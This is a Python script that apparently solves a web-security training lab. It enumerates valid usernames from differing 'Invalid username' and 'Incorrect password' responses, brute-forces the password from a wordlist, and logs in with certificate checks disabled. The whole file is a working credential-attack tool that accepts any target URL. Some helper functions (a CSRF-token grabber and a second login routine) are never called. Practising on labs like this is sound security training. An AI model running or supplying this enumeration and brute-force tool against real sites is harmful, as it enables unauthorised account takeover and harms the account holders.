import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}

# login request to determine responses
def login(s, url, username, password):
        data = {"username": username, "password": password}
        r = s.post(url, data=data, allow_redirects=False, verify=False)
        if r.status_code == 302:
            return "success"
        if "Invalid username" in r.text:
            return "invalid_user"
        if "Incorrect password" in r.text:
            return "wrong_password"
        return "unknown"

# find valid username
def get_username(s, url, wordlist):
    print("[*] Enumerating usernames...")
    with open(wordlist, "r") as f:
        for line in f:
            username = line.strip()
            if not username:
                continue
            sys.stdout.write(f"\r[*] Trying: {username:<20}")
            sys.stdout.flush()
            if login(s, url, username, "whatever") == "wrong_password":
                print(f"\n[+] Valid username: {username}") 
                return username
    print("\n[-] No valid username found")
    return None          
    

# using discovered username bruteforce password
def get_password (s, url, username, wordlist):
        print(f"[*] Bruteforcing passwords for {username}...")
        with open(wordlist, "r") as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                sys.stdout.write(f"\r[*] Trying: {password:<20}")
                sys.stdout.flush()
                if login(s, url, username, password) == "success":
                    print(f"\n[+] Valid password: {password}") 
                    return password
        print("\n[-] No valid password found")
        return None 

# grab csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

# login as user
def user_login(s, url, username, password):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(url + "/login", data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    return False

def main():
    if len(sys.argv) < 4 or len(sys.argv) > 5:
        print(f"[-] Usage:   {sys.argv[0]} <url> <usernames> <passwords> [proxy]")
        sys.exit()

    url          = sys.argv[1].strip().rstrip("/") + "/login"
    usernames    = sys.argv[2].strip()
    passwords    = sys.argv[3].strip()

    print(f"[*] Target: {url}")

    s = requests.Session()

    # step 1 - find valid username
    username = get_username(s, url, usernames)
    if not username:
        sys.exit(1)

    # step 2 - brute force password
    password = get_password(s, url, username, passwords)
    if not password:
        sys.exit(1)


    # step 3 - login
    if login(s, url, username, password) == "success":
        print(f"[+] Successfully logged in as {username}:{password}")
    else:
        print("[-] Login failed") 

    # step 4 - visit account page to trigger lab solved
    r = s.get(url.replace("/login", "/my-account"), verify=False)
    if "Log out" in r.text:
        print("[+] Lab solved")
    else:
        print("[-] Account page not reached")    

if __name__ == "__main__":
    main()